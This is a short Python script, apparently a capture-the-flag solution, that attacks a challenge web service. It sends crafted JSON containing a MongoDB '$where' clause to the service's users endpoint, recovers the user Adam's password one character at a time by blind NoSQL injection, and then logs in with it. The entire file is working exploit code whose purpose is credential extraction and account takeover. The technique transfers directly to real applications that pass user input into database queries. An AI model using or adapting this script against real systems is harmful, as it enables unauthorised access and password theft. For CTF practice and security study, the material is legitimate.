#!/usr/bin/env python3
import requests

url = 'http://challs.crate.nu:47896/'

alphabet = 'abcdef1234567890-'

s = requests.Session()

password = ''
target = 'Adam'

while True:
    for c in alphabet:
        payload = f'{{"name": "{target}", "$where": "this.password[{len(password)}] == \'{c}\'"}}'
        r = s.post(url + 'users', data=payload)
        if target in r.text:
            password += c
            print(password)
            break
    else:
        break

r = s.post(url + 'login', data=f'{{"name": "{target}", "password": "{password}"}}')
print(r.text)
